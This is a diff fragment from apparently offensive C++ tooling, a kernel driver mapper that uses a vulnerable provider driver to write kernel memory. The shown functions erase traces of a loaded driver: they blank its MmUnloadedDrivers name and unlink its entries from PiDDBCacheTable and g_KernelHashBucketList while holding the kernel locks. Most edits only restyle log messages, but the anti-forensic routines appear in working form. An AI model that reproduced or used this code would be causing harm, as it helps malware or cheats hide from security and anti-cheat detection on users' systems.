+		Log(L"[-] Driver name is implausible, refusing to write" << std::endl);
 		return false;
 	}
 
@@ -1809,19 +1855,19 @@ bool Driver::ClearMmUnloadedDrivers() {
 	}
 
 	if (!name_is_ours) {
-		Log(L"[!] Loader entry holds \"" << found_name << L"\" but this provider was loaded as \""
-			<< expected_name << L"\", the offsets do not point at it; refusing to write" << std::endl);
+		Log(L"[-] Loader entry holds \"" << Val(found_name) << L"\" but this provider was loaded as \""
+			<< Val(expected_name) << L"\", the offsets do not point at it; refusing to write" << std::endl);
 		return false;
 	}
 
 	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver
 
 	if (!WriteMemory(driver_section + g_offsets.LdrEntry_BaseDllName, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
-		Log(L"[!] Failed to write driver name length" << std::endl);
+		Log(L"[-] Failed to write driver name length" << std::endl);
 		return false;
 	}
 
-	Log(L"[+] MmUnloadedDrivers Cleaned: " << found_name << std::endl);
+	Log(L"[+] MmUnloadedDrivers = Cleaned | EntryName = " << Val(found_name) << std::endl);
 	return true;
 }
 
@@ -1904,7 +1950,7 @@ bool Driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
 	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");
 
 	if (!kernel_ExAcquireResourceExclusiveLite) {
-		Log(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
+		Log(L"[-] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
 		return false;
 	}
 
@@ -1921,7 +1967,7 @@ bool Driver::ExReleaseResourceLite(PVOID Resource) {
 	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExReleaseResourceLite");
 
 	if (!kernel_ExReleaseResourceLite) {
-		Log(L"[!] Failed to find ExReleaseResourceLite" << std::endl);
+		Log(L"[-] Failed to find ExReleaseResourceLite" << std::endl);
 		return false;
 	}
 
@@ -1936,7 +1982,7 @@ BOOLEAN Driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
 	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(Driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");
 
 	if (!kernel_RtlDeleteElementGenericTableAvl) {
-		Log(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
+		Log(L"[-] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
 		return false;
 	}
 
@@ -1953,7 +1999,7 @@ PVOID Driver::RtlLookupElementGenericTableAvl(Nt::PRTL_AVL_TABLE Table, PVOID Bu
 	static uint64_t kernel_RtlLookupElementGenericTableAvl = GetKernelModuleExport(Driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");
 
 	if (!kernel_RtlLookupElementGenericTableAvl) {
-		Log(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
+		Log(L"[-] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
 		return nullptr;
 	}
 
@@ -2024,7 +2070,8 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 		Log(L"[-] Can't lock PiDDBCacheTable" << std::endl);
 		return false;
 	}
-	Log(L"[+] PiDDBLock Locked" << std::endl);
+	LogBlank();
+	Log(L"[+] PiDDBLock = Locked" << std::endl);
 
 	auto n = GetDriverNameW();
 
@@ -2056,7 +2103,7 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 	//the one assumed, and every read below would be a bad address handed to the
 	//provider.
 	if (!IsKernelAddress((uint64_t)pFoundEntry)) {
-		Log(L"[!] PiDDBCacheTable lookup returned a non-kernel pointer, aborting cleanup" << std::endl);
+		Log(L"[-] PiDDBCacheTable lookup returned a non-kernel pointer, aborting cleanup" << std::endl);
 		ExReleaseResourceLite(PiDDBLock);
 		return false;
 	}
@@ -2068,13 +2115,14 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 		const std::wstring needle = n;
 		const uint32_t name_field = FindUnicodeStringFieldByContent((uint64_t)pFoundEntry, 0x80, needle);
 		if (name_field == 0) {
-			Log(L"[!] Could not locate the driver name inside the PiDDB entry, aborting cleanup" << std::endl);
+			Log(L"[-] Could not locate the driver name inside the PiDDB entry, aborting cleanup" << std::endl);
 			ExReleaseResourceLite(PiDDBLock);
 			return false;
 		}
 
-		Log(L"[+] PiDDB entry name field located at +0x" << std::hex << name_field << std::dec << L" (verified by content)" << std::endl);
+		Log(L"[+] PiDDBEntryNameFieldOffset = " << Val(Hex(name_field)) << L" | VerifiedByContent = OK" << std::endl);
 	}
+	LogBlank();
 
 	// first, unlink from the list
 	PLIST_ENTRY prev;
@@ -2094,12 +2142,12 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 	//the entry layout does not match this build, and the write would go to a bad
 	//address through the provider.
 	if (!IsKernelAddress((uint64_t)prev) || !IsKernelAddress((uint64_t)next)) {
-		Log(L"[!] PiDDBCacheTable entry links are not kernel addresses, aborting cleanup" << std::endl);
+		Log(L"[-] PiDDBCacheTable entry links are not kernel addresses, aborting cleanup" << std::endl);
 		ExReleaseResourceLite(PiDDBLock);
 		return false;
 	}
 
-	Log("[+] Found Table Entry = 0x" << std::hex << pFoundEntry << std::dec << std::endl);
+	Log(L"[+] TableEntry = " << Val(reinterpret_cast<void*>(pFoundEntry)) << std::endl);
 
 	if (!WriteMemory((uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &next, sizeof(_LIST_ENTRY*))) {
 		Log(L"[-] Can't set next entry" << std::endl);
@@ -2128,8 +2176,8 @@ bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
 
 	// release the ddb resource lock
 	ExReleaseResourceLite(PiDDBLock);
-
-	Log(L"[+] PiDDBCacheTable Cleaned" << std::endl);
+	Log(L"[+] PiDDBCacheTable = Cleaned" << std::endl);
+	Log(L"[+] PiDDBLock = Released" << std::endl);
 
 	return true;
 }
@@ -2173,13 +2221,14 @@ bool Driver::ClearKernelHashBucketList() {
 
 	PVOID g_KernelHashBucketList = (PVOID)(ci + g_KernelHashBucketListOffset);
 	PVOID g_HashCacheLock = (PVOID)(ci + g_HashCacheLockOffset);
-	Log(L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::dec << std::endl);
+	LogBlank();
+	Log(L"[+] g_KernelHashBucketList = " << Val(reinterpret_cast<void*>(g_KernelHashBucketList)) << std::endl);
 
 	if (!ExAcquireResourceExclusiveLite(g_HashCacheLock, true)) {
 		Log(L"[-] Can't lock g_HashCacheLock" << std::endl);
 		return false;
 	}
-	Log(L"[+] g_HashCacheLock Locked" << std::endl);
+	Log(L"[+] g_HashCacheLock = Locked" << std::endl);
 
 	Nt::HashBucketEntry* prev = (Nt::HashBucketEntry*)g_KernelHashBucketList;
 	Nt::HashBucketEntry* entry = 0;
@@ -2201,7 +2250,7 @@ bool Driver::ClearKernelHashBucketList() {
 	std::wstring wdname = GetDriverNameW();
 	std::wstring search_path = GetDriverPath();
 	if (search_path.length() < 2) {
-		Log(L"[!] Unexpected driver path, cannot match the hash bucket entry" << std::endl);
+		Log(L"[-] Unexpected driver path, cannot match the hash bucket entry" << std::endl);
 		ExReleaseResourceLite(g_HashCacheLock);
 		return false;
 	}
@@ -2252,8 +2301,8 @@ bool Driver::ClearKernelHashBucketList() {
 			//layout does not match this build; abort rather than hand the
 			//provider a bad address to fault on.
 			if ((uint64_t)wsNamePtr < 0xFFFF000000000000ULL) {
-				Log(L"[!] g_KernelHashBucketList entry text ptr 0x" << std::hex << (uint64_t)wsNamePtr
-					<< std::dec << L" is not a kernel address, refusing to read it" << std::endl);
+				Log(L"[-] g_KernelHashBucketList entry text ptr " << Val(reinterpret_cast<void*>(wsNamePtr))
+					<< L" is not a kernel address, refusing to read it" << std::endl);
 				if (!ExReleaseResourceLite(g_HashCacheLock)) {
 					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 				}
@@ -2286,7 +2335,8 @@ bool Driver::ClearKernelHashBucketList() {
 				 * thread kept AutoBoostActive set and bugchecked 0x13C
 				 * INVALID_IO_BOOST_STATE when it was torn down.
 				 */
-				Log(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
+				LogBlank();
+				Log(L"[+] FoundInKernelHashBucketList = " << Val(std::wstring(&wsName[find_result])) << std::endl);
 				Nt::HashBucketEntry* Next = 0;
 				if (!ReadMemory((uintptr_t)entry, &Next, sizeof(PVOID))) {
 					Log(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
@@ -2311,11 +2361,12 @@ bool Driver::ClearKernelHashBucketList() {
 					}
 					return false;
 				}
-				Log(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
+				Log(L"[+] g_KernelHashBucketList = Cleaned" << std::endl);
 				if (!ExReleaseResourceLite(g_HashCacheLock)) {
 					Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
 					return false;
 				}
+				Log(L"[+] g_HashCacheLock = Released" << std::endl);
 				return true;
 			}
 		}
